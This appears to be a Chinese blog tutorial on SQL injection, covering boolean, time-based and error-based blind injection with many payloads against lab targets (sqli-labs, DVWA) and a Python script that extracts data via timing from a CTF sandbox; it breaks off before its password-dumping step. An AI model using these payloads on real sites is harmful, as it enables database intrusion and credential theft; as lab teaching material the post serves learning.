<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>安全基础~通用漏洞2 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="安全基础~通用漏洞2" />
<meta property="og:description" content="文章目录 知识补充盲注Boolean盲注延时盲注报错注入二次注入 知识补充 盲注常用
if(条件,5,0) #条件成立 返回5 反之 返回0
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
盲注 盲注就是在注入过程中，获取的数据不能回显至前端页面。
基于布尔的SQL盲注-逻辑判断
regexp,like,ascii,left,ord,mid
-基于时间的SQL盲注-延时判断
if,sleep
-基于报错的SQL盲注-报错回显
floor，updatexml，extractvalue
参考：https://www.jianshu.com/p/bc35f8dd4f7c
PHP开发项目-输出结果&amp;开启报错
基于延时：都不需要
/blog/news.php?id=1 and if(1=1,sleep(5),0)
基于布尔：有数据库输出判断标准
/blog/news.php?id=1 and length(database())=7
基于报错：有数据库报错处理判断标准
/blog/news.php?id=2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
Boolean盲注 仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False
在爆库名时，手工爆库可以使用二分法来确定
1&#39; and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）； 1&#39; and ascii(substr(database(),1,1))&lt;122 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）； 1&#39; and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值） 1&#39; and ascii(substr(database(),1,1))&lt;103 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）； 1&#39; and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）； 1&#39; and ascii(substr(database(),1,1))=100 #，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。 重复以上步骤直到得出完整的数据库名dvwa 1&#39; and ascii(substr(database(),n,1))&gt;100 ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/7e32685aff66867ebef13d6a019ebc69/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-23T23:52:46+08:00" />
<meta property="article:modified_time" content="2024-01-23T23:52:46+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">安全基础~通用漏洞2</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_1" rel="nofollow">知识补充</a></li><li><a href="#_5" rel="nofollow">盲注</a></li><li><ul><li><a href="#Boolean_24" rel="nofollow">Boolean盲注</a></li><li><a href="#_91" rel="nofollow">延时盲注</a></li><li><a href="#_182" rel="nofollow">报错注入</a></li><li><a href="#_220" rel="nofollow">二次注入</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="_1"></a>知识补充</h2> 
<p><font color="#C678DD" size="4"><strong>盲注常用</strong></font><br> <code>if(条件,5,0)</code> #条件成立 返回5 反之 返回0<br> <code>left(database(),1)</code>，database() #left(a,b)从左侧截取a的前b位</p> 
<h2><a id="_5"></a>盲注</h2> 
<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br> 基于布尔的SQL盲注-逻辑判断<br> regexp,like,ascii,left,ord,mid<br> -基于时间的SQL盲注-延时判断<br> if,sleep<br> -基于报错的SQL盲注-报错回显<br> floor，updatexml，extractvalue<br> 参考：<a href="https://www.jianshu.com/p/bc35f8dd4f7c" rel="nofollow">https://www.jianshu.com/p/bc35f8dd4f7c</a></p> 
<p>PHP开发项目-输出结果&amp;开启报错<br> 基于延时：都不需要<br> /blog/news.php?id=1 and if(1=1,sleep(5),0)<br> 基于布尔：有数据库输出判断标准<br> /blog/news.php?id=1 and length(database())=7<br> 基于报错：有数据库报错处理判断标准<br> /blog/news.php?id=2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p> 
<h3><a id="Boolean_24"></a>Boolean盲注</h3> 
<p>仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False</p> 
<p>在爆库名时，手工爆库可以使用二分法来确定</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">' and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）；
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">122</span> <span class="token comment">#，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）；</span>
<span class="token number">1</span><span class="token string">' and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值）
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">103</span> <span class="token comment">#，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）；</span>
<span class="token number">1</span><span class="token string">' and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）；
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">100</span> <span class="token comment">#，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。</span>
重复以上步骤直到得出完整的数据库名dvwa
<span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">100</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre> 
<pre><code class="prism language-sql">这里以sqlabs靶场为例

通过length函数 判断数据库长度和数据表字段信息数量。
通过substr、ascii函数 判断数据库名、表名、字段值等。

求数据库的长度       
http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-8/?id=1' and length(database()) = 8 --+</span>

判断数据库第一位的字母
http:<span class="token comment">//127.0.0.1/sqli-labs-master/Less-8/?id=1' and substr(database(),1,1) = 's' --+</span>

判断表的数量
<span class="token number">1</span><span class="token string">' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显⽰不存在
1'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment"># 显⽰存在</span>

求数据库中表名的长度
第一个表名长度：<span class="token string">'and length((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1))=6--+
第二个表名长度 '</span><span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token comment">--+</span>
长度为<span class="token number">6</span>、<span class="token number">8</span>

查询第一个表的第一位字符
<span class="token string">'and ascii(substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1))=117--+

查询第二个表的第一个字符
'</span><span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">117</span><span class="token comment">--+</span>

判断字段的长度
<span class="token string">'and length((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users<span class="token string">' limit 0,1))=6--+‘

猜解第一个字段名的第一个字符为：u
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span> <span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">117</span> <span class="token comment">#</span>
判断第一个字段第二个字符的ascii：s
<span class="token string">'and ord(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users<span class="token string">' limit 0,1),2,1))=115--+

猜解第二个字段名的第一个字符为：f
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span> <span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">102</span> <span class="token comment">#</span>
猜解第二个字段名的第二个字符为：i
<span class="token number">1</span><span class="token string">' and ascii(substr((select column_name from information_schema.columns where table_name= '</span>users<span class="token string">' limit 1,1),2,1))=105 #

猜解 dvwa.users 表下的 user 列的第一个字段内容为：a
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">97</span> <span class="token comment"># </span>
猜解 dvwa<span class="token punctuation">.</span>users 表下的 <span class="token keyword">user</span> 列的第二个字段内容为：d
<span class="token number">1</span><span class="token string">' and ascii(substr((select user from dvwa.users limit 0,1),1,1))=100 # 
猜解 dvwa.users 表下的 user 列的第三个字段内容为：m
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span> <span class="token comment"># </span>

<span class="token comment"># 暴力猜解</span>
猜解 <span class="token keyword">user</span> 字段值是否为 admin
<span class="token number">1</span><span class="token string">' and (select count(*) from users where user = '</span>admin'<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">#</span>
</code></pre> 
<h3><a id="_91"></a>延时盲注</h3> 
<p>判断返回正确还是错误，sleep延时注入更倾向于无法判断正误，通过自己构造页面刷新时间来判断正误。</p> 
<pre><code class="prism language-sql">可以结合 <span class="token operator">&gt;</span> <span class="token operator">&lt;</span> <span class="token operator">=</span> 判断运算符，采用二分法，构造如下的语句，分别猜测试出<span class="token number">8</span>字符，比如，先用 <span class="token operator">&gt;</span> <span class="token number">50</span>判断，如果成立，再用<span class="token operator">&lt;</span> <span class="token number">123</span> 判断，如果不成立，则正确的值就在<span class="token number">50</span><span class="token operator">-</span><span class="token number">123</span>之前，
这样不段的尝试最终用<span class="token operator">=</span> 确定具体值。
?id<span class="token operator">=</span><span class="token number">1</span>’ <span class="token operator">and</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> – <span class="token operator">+</span>
?id<span class="token operator">=</span><span class="token number">1</span>’ <span class="token operator">and</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> – <span class="token operator">+</span>
?id<span class="token operator">=</span><span class="token number">1</span>’ <span class="token operator">and</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> – <span class="token operator">+</span>
</code></pre> 
<pre><code class="prism language-sql"><span class="token comment"># 数据库个数</span>
<span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token punctuation">)</span><span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       如果数据库总数等于<span class="token number">7</span>响应时间为<span class="token number">0</span>秒，如果不等于<span class="token number">7</span> 相应时间为<span class="token number">5</span>秒

<span class="token comment"># 数据库名长度</span>
<span class="token string">' and sleep(if((length(database()) = 8),0,5))--+     //当前数据库名长度为8

# 猜解数据库名
'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token number">115</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+    //ascii码115 就是 s</span>

<span class="token comment"># 获取该数据库中表的总数</span>
<span class="token string">' and sleep(if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2,0,5))--+

# 枚举当前数据库的表名
1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> a<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>n <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
或者利用<span class="token keyword">if</span>函数
<span class="token number">1</span><span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) &gt;n,sleep(5),1) --+

枚举当前数据库表的字段名

1'</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> a<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>n <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">--+</span>

枚举每个字段对应的数据项内容

<span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">limit</span> a<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>n <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre> 
<p>通常延时注入使用脚本进行，也可以使用sqlmap进行</p> 
<pre><code class="prism language-py"> <span class="token keyword">import</span> requests
 <span class="token keyword">import</span> sys
 <span class="token keyword">import</span> time
 
 session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
 url <span class="token operator">=</span> <span class="token string">"http://challenge-e53e5a329b0199fa.sandbox.ctfhub.com:10080/?id="</span>
 name <span class="token operator">=</span> <span class="token string">""</span>
 
 <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
         <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
             j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">128</span><span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">-</span>j
             str_ascii<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
             <span class="token comment">#数据库名</span>
             payolad <span class="token operator">=</span> <span class="token string">"if(substr(database(),%s,1) = '%s',sleep(1),1)"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>str_ascii<span class="token punctuation">)</span><span class="token punctuation">)</span>
             <span class="token comment">#表名</span>
             <span class="token comment">#payolad = "if(substr((select table_name from information_schema.tables where table_schema='sqli' limit %d,1),%d,1) = '%s',sleep(1),1)" %(k,i,str(str_ascii))</span>
             <span class="token comment">#字段名</span>
             <span class="token comment">#payolad = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',sleep(1),1)" %(i,str(str_ascii))</span>
             start_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
             str_get <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> payolad<span class="token punctuation">)</span>
             end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
             t <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
             <span class="token keyword">if</span> t <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                 <span class="token keyword">if</span> str_ascii <span class="token operator">==</span> <span class="token string">"+"</span><span class="token punctuation">:</span>
                     sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
                 <span class="token keyword">else</span><span class="token punctuation">:</span>
                     name<span class="token operator">+=</span>str_ascii
                     <span class="token keyword">break</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
 
 <span class="token comment"># #查询字段内容</span>
 <span class="token comment"># for i in range(1,50):</span>
 <span class="token comment">#     print(i)</span>
 <span class="token comment">#     for j in range(31,128):</span>
 <span class="token comment">#         j = (128+31) -j</span>
 <span class="token comment">#         str_ascii=chr(j)</span>
 <span class="token comment">#         payolad = "if(substr((select flag from sqli.flag),%d,1) = '%s',sleep(1),1)" %(i,str_ascii)</span>
 <span class="token comment">#         start_time = time.time()</span>
 <span class="token comment">#         str_get = session.get(url=url + payolad)</span>
 <span class="token comment">#         end_time = time.time()</span>
 <span class="token comment">#         t = end_time - start_time</span>
 <span class="token comment">#         if t &gt; 1:</span>
 <span class="token comment">#             if str_ascii == "+":</span>
 <span class="token comment">#                 sys.exit()</span>
 <span class="token comment">#             else:</span>
 <span class="token comment">#                 name += str_ascii</span>
 <span class="token comment">#                 break</span>
 <span class="token comment">#     print(name)</span>
</code></pre> 
<p><a href="https://blog.csdn.net/cypher_x/article/details/119973216">脚本参考</a><br> <a href="https://www.bilibili.com/video/BV19A4y1S7nr?p=22&amp;vd_source=feda7b4b64bdcc4da7a9d3fc1f949e0b" rel="nofollow">讲解参考</a></p> 
<h3><a id="_182"></a>报错注入</h3> 
<p><code>floor()</code>函数报错注入原理：<br> <code>selsct count(*) ,floor(rand(0)*2)xx from products group by xx</code></p> 
<p>随机种子时固定的，所以产生的随机数也是固定的，<code>floor(rand(0)*2</code>，结果为011011</p> 
<p><font color="#F3B559" size="4"><code>group by key</code> 执行时循环读取数据的每一行，将结果保存于<strong>临时表</strong>中。读取每一行的 key 时，<br> 如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果<br> 该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算<br> rand 值）</font><br> 简而言之，就是插入数据时，会再次出发rand()</p> 
<p>爆出duplicate entry错误，就是1重复了。<br> <img src="https://images2.imgbox.com/d6/31/MQWoq4UU_o.png" alt="such as"><br> <img src="https://images2.imgbox.com/21/fa/aurEcoVk_o.png" alt="报错"></p> 
<pre><code class="prism language-sql">①判断是否存在报错注入
id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x#

②爆出当前数据库名
id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">group</span> <span class="token keyword">by</span> x <span class="token comment">#</span>

③爆出表
id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='</span>dvwa<span class="token string">' limit 0,1)) x from information_schema.schemata group by x#
id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'dvwa'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token comment">#</span>

④爆出字段名
id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' and table_schema='</span>dvwa<span class="token string">' limit 0,1)) x from information_schema.schemata group by x#
 改变limit限定数值，可以得出当前的字段 user_id first_name user password

⑤爆出user和password
